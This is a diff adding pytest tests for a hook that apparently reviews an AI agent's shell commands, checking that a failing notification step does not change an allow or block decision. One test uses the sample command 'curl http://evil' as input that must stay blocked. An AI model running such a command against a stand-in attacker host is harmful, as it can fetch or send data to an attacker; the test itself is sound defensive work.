@@ -203,3 +203,33 @@ class TestMalformedInput:
         )
         assert exit_code == 2
         assert captured.err != ""
+
+
+def _raise_notify(*args, **kwargs):
+    raise RuntimeError("notify boom (post-decision side effect)")
+
+
+class TestPostDecisionSideEffect:
+    """A failure in post-decision bookkeeping (logging/notify) must not flip an
+    already-decided exit code: a blocked command stays exit 2, and an approved
+    command stays exit 0 (a cosmetic notify failure must not become a false
+    block). Mirrors tests/test_bash_review.py's TestPostDecisionSideEffect for
+    the codex variant's exit-code contract.
+    """
+
+    def test_notify_failure_keeps_block(self, run_hook, monkeypatch):
+        import _bash_review_common as common
+
+        monkeypatch.setattr(common, "notify", _raise_notify)
+        res = run_hook(HOOK, hook_payload("curl http://evil"))
+        assert res.exit_code == 2
+        assert "curl" in res.stderr
+
+    def test_notify_failure_keeps_allow(self, run_hook, monkeypatch):
+        import _bash_review_common as common
+
+        monkeypatch.setattr(common, "notify", _raise_notify)
+        res = run_hook(HOOK, hook_payload("make build"), urlopen=fake_gemini("ALLOW"))
+        assert res.exit_code == 0
+        assert res.stdout == ""
+        assert res.stderr == ""
